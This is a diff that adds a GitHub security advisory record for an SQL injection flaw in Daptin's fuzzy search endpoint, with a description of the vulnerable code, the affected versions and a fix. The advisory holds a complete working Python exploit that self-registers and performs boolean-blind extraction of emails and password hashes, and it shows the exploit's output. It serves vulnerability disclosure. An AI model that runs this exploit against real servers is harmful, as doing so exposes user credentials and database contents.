@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-pwqg-q8pg-pp6r",
+  "modified": "2026-05-06T22:20:30.174769Z",
+  "published": "2026-05-06T22:10:11Z",
+  "aliases": [
+    "CVE-2026-44349"
+  ],
+  "summary": "Daptin fuzzy search injects unvalidated column name into raw SQL",
+  "details": "## Summary\n\n`processFuzzySearch` in `server/resource/resource_findallpaginated.go:1484` splits the user-supplied `column` parameter by comma and interpolates each segment directly into `goqu.L(fmt.Sprintf(\"LOWER(%s) LIKE ?\", prefix+col))` raw SQL with no column whitelist check. The entry point is `GET /api/\u003centity\u003e` with `operator=fuzzy` (or `fuzzy_any`, `fuzzy_all`). Any authenticated user — including one who self-registered with no admin involvement — can read the entire database.\n\n---\n\n## Details\n\nAt `resource_findallpaginated.go:1761`, when the operator is `fuzzy`, `fuzzy_any`, or `fuzzy_all`, execution routes to `processFuzzySearch` (line 1763) before `processQueryFilter` (line 1780). `processQueryFilter` is the only path that calls `GetColumnByName` (line 1351), which validates column names against the table schema. The fuzzy branch never reaches that check.\n\nInside `processFuzzySearch` (line 1484), `filterQuery.ColumnName` is split by comma. After `strings.TrimSpace` (line 1486), each segment is routed to a DB-driver-specific function. The injectable sink reached depends on the driver and the `fuzzy_options.fallback_mode` field.\n\n**SQLite** (`processFuzzySearchSQLite`, lines 1632–1676) uses `goqu.L` in all code paths — no `fallback_mode` required:\n- `goqu.L(fmt.Sprintf(\"LOWER(%s) LIKE ?\", prefix+col), ...)` — line 1650/1657\n\n**PostgreSQL, MySQL, MSSQL** default to `goqu.Ex` (identifier-quoted, not injectable). The `goqu.L` sink is only reached when the attacker supplies a specific `fuzzy_options.fallback_mode` value in the HTTP `query` JSON:\n\n- PostgreSQL `word_boundary` mode (line 1540): `goqu.L(fmt.Sprintf(\"%s ~* ?\", prefix+col), ...)`\n- MySQL `soundex` mode (line 1598): `goqu.L(fmt.Sprintf(\"SOUNDEX(%s) = SOUNDEX(?)\", prefix+col), ...)`\n- MSSQL `soundex` mode (line 1694): `goqu.L(fmt.Sprintf(\"DIFFERENCE(%s, ?) \u003e= 3\", prefix+col), ...)`\n\n`fuzzy_options` is deserialized from the HTTP request at line 243 (`json.Unmarshal([]byte(query[0]), \u0026queries)`) — it is fully attacker-controlled.\n\n`goqu.L` emits its first argument as a raw SQL literal. The column position uses `%s` string formatting, not a bound parameter.\n\n`prefix` is fixed at line 351 as `dbResource.model.GetName() + \".\"` — for `/api/world` this is `\"world.\"`. Against SQLite, an attacker-supplied column value of `reference_id) OR 1=1 OR LOWER(world.reference_id` expands in the WHERE clause to `LOWER(world.reference_id) OR 1=1 OR LOWER(world.reference_id) LIKE ?`. Against PostgreSQL (where `reference_id` is stored as `bytea`), the `~*` regex operator requires a text-type column; the attack targets a `varchar` column instead (e.g., `table_name`) with an adapted injection template.\n\n**Relation to GHSA-rw2c-8rfq-gwfv**: That patch modified `resource_aggregate.go` to fix `/aggregate/:typename`. This vulnerability is in `resource_findallpaginated.go` on the `/api/\u003centity\u003e` fuzzy path — different file, different endpoint, different operator. The existing patch does not cover this path.\n\n**Tested:** SQLite injection dynamically confirmed (boolean-blind extraction, email extracted). PostgreSQL `word_boundary` injection dynamically confirmed (baseline=0 rows, tautology=5 rows, email=`guest@cms.go` extracted via text column). MySQL and MSSQL confirmed by code review; MySQL binary panics on initialization in the test harness (unrelated daptin bug), dynamic verification not performed.\n\n**Fix**: Add a `GetColumnByName` whitelist check in `processFuzzySearch` (line 1484) before the comma-split, matching the pattern in `processQueryFilter:1351`. All four DB driver sinks require fixing.\n\n---\n\n## PoC\n\n**Environment:**\n\n```bash\ngit clone https://github.com/daptin/daptin\ncd daptin\ngit checkout 5d3214244890989eceefa694bfc976ef11458721\ngo build -o daptin-server .\n./daptin-server   # listens on :6336, SQLite backend by default\n```\n\n**poc.py** (Python 3, no dependencies):\n\n```python\nimport json, urllib.request, urllib.parse\n\nBASE = \"http://localhost:6336\"\n\ndef post(path, body):\n    req = urllib.request.Request(BASE + path, json.dumps(body).encode(),\n                                 {\"Content-Type\": \"application/json\"})\n    try:\n        return json.loads(urllib.request.urlopen(req, timeout=10).read(50_000))\n    except urllib.request.HTTPError as e:\n        return json.loads(e.read(50_000))\n\ndef token():\n    post(\"/action/user_account/signup\", {\"attributes\": {\n        \"name\": \"poc\", \"email\": \"poc@test.com\",\n        \"password\": \"adminadmin\", \"passwordConfirm\": \"adminadmin\"}})\n    body = post(\"/action/user_account/signin\", {\"attributes\": {\n        \"email\": \"poc@test.com\", \"password\": \"adminadmin\"}})\n    return next(i[\"Attributes\"][\"value\"] for i in body\n                if i.get(\"ResponseType\") == \"client.store.set\")\n\ndef rows(col, jwt):\n    q = urllib.parse.urlencode({\"query\": json.dumps(\n        [{\"column\": col, \"operator\": \"fuzzy\", \"value\": \"zzzzz\"}])})\n    req = urllib.request.Request(f\"{BASE}/api/world?{q}\u0026page%5Bsize%5D=5\",\n                                 headers={\"Authorization\": \"Bearer \" + jwt})\n    d = json.loads(urllib.request.urlopen(req, timeout=10).read(50_000))\n    return len(d.get(\"data\", []))\n\ndef oracle(expr, jwt):\n    col = f\"reference_id) OR ({expr}) OR LOWER(world.reference_id\"\n    return rows(col, jwt) \u003e 0\n\ndef extract_int(sql, jwt, hi=200):\n    lo = 0\n    while lo \u003c hi:\n        mid = (lo + hi + 1) // 2\n        if oracle(f\"({sql}) \u003e= {mid}\", jwt): lo = mid\n        else: hi = mid - 1\n    return lo\n\ndef extract_str(sql, jwt, maxlen=80):\n    n = extract_int(f\"LENGTH(({sql}))\", jwt, hi=maxlen)\n    s = \"\"\n    for _ in range(n):\n        lo, hi = 32, 126\n        while lo \u003c hi:\n            mid = (lo + hi) // 2\n            pfx = s.replace(\"'\", \"''\")\n            expr = f\"({sql}) \u003e= '{pfx}'||char({mid+1})\" if s else f\"({sql}) \u003e= char({mid+1})\"\n            if oracle(expr, jwt): lo = mid + 1\n            else: hi = mid\n        s += chr(lo)\n    return s\n\njwt = token()\nprint(\"baseline :\", rows(\"reference_id\", jwt), \"rows\")\nprint(\"tautology:\", rows(\"reference_id) OR 1=1 OR LOWER(world.reference_id\", jwt), \"rows\")\n\njwt = token()\nprint(\"sqlite_master table count:\", extract_int(\"SELECT count(*) FROM sqlite_master WHERE type='table'\", jwt, hi=80))\nprint(\"email (row 1):\", extract_str(\"SELECT email FROM user_account ORDER BY id LIMIT 1\", jwt))\npw_hex = extract_str(\"SELECT HEX(password) FROM user_account WHERE email='poc@test.com' LIMIT 1\", jwt, maxlen=40)\nprint(\"pw hash prefix:\", bytes.fromhex(pw_hex).decode(\"ascii\", errors=\"replace\"))\n```\n\n**Output** (measured on commit `5d32142`, SQLite, macOS arm64):\n\n```\nbaseline : 0 rows\ntautology: 5 rows\nsqlite_master table count: 57\nemail (row 1): guest@cms.go\npw hash prefix: $2a$11$W7vO9oOPzpf7u\n```\n\n---\n\n## Impact\n\n**Attacker precondition**: One valid JWT. Self-signup is enabled by default on a fresh daptin instance — no admin involvement required.\n\n**What is impacted**: The full database is readable via boolean-blind extraction, including all tables visible in `sqlite_master` and credential data (emails, bcrypt password hashes) in `user_account`. Extraction rate is approximately 7 HTTP requests per character, making full-database extraction feasible.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/daptin/daptin",
+        "purl": "pkg:golang/github.com/daptin/daptin"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.11.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.11.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-pwqg-q8pg-pp6r/GHSA-pwqg-q8pg-pp6r.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/daptin/daptin/security/advisories/GHSA-pwqg-q8pg-pp6r"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/daptin/daptin"
+    }
+  ]
+}
